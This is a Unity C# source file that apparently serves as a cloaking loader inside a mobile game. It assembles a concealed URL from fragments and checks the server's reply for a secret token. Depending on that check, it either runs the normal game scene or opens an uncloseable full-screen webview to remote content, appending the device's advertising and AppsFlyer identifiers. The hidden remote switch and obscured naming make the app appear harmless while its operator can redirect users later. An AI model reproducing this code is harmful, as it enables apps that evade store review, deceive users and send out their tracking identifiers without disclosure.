using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainPOG : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string onePOGName = "";
    [HideInInspector] public string twoPOGName = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaPOG") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { onePOGName = advertisingId; });
        }
    }

    private void RunPOG()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Bootstrap");
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlPOGejection", string.Empty) != string.Empty)
            {
                ROUNDPOGSPOT(PlayerPrefs.GetString("UrlPOGejection"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoPOGName += n;
                }
                StartCoroutine(IENUMENATORPOG());
            }
        }
        else
        {
            RunPOG();
        }
    }   
        

    private void ROUNDPOGSPOT(string UrlPOGejection, string NamingPOG = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _dunesPOG = gameObject.AddComponent<UniWebView>();
        _dunesPOG.SetToolbarDoneButtonText("");
        switch (NamingPOG)
        {
            case "0":
                _dunesPOG.SetShowToolbar(true, false, false, true);
                break;
            default:
                _dunesPOG.SetShowToolbar(false);
                break;
        }
        _dunesPOG.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _dunesPOG.OnShouldClose += (view) =>
        {
            return false;
        };
        _dunesPOG.SetSupportMultipleWindows(true);
        _dunesPOG.SetAllowBackForwardNavigationGestures(true);
        _dunesPOG.OnMultipleWindowOpened += (view, windowId) =>
        {
            _dunesPOG.SetShowToolbar(true);

        };
        _dunesPOG.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingPOG)
            {
                case "0":
                    _dunesPOG.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _dunesPOG.SetShowToolbar(false);
                    break;
            }
        };
        _dunesPOG.OnOrientationChanged += (view, orientation) =>
        {
            _dunesPOG.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _dunesPOG.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlPOGejection", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlPOGejection", url);
            }
        };
        _dunesPOG.Load(UrlPOGejection);
        _dunesPOG.Show();
    }

    private IEnumerator IENUMENATORPOG()
    {
        using (UnityWebRequest pog = UnityWebRequest.Get(twoPOGName))
        {

            yield return pog.SendWebRequest();
            if (pog.isNetworkError)
            {
                RunPOG();
            }
            int timetablePOG = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && timetablePOG > 0)
            {
                yield return new WaitForSeconds(1);
                timetablePOG--;
            }
            try
            {
                if (pog.result == UnityWebRequest.Result.Success)
                {
                    if (pog.downloadHandler.text.Contains("PrmdsfGdskndqWE"))
                    {

                        try
                        {
                            var subs = pog.downloadHandler.text.Split('|');
                            ROUNDPOGSPOT(subs[0] + "?idfa=" + onePOGName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            ROUNDPOGSPOT(pog.downloadHandler.text + "?idfa=" + onePOGName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        RunPOG();
                    }
                }
                else
                {
                    RunPOG();
                }
            }
            catch
            {
                RunPOG();
            }
        }
    }
}
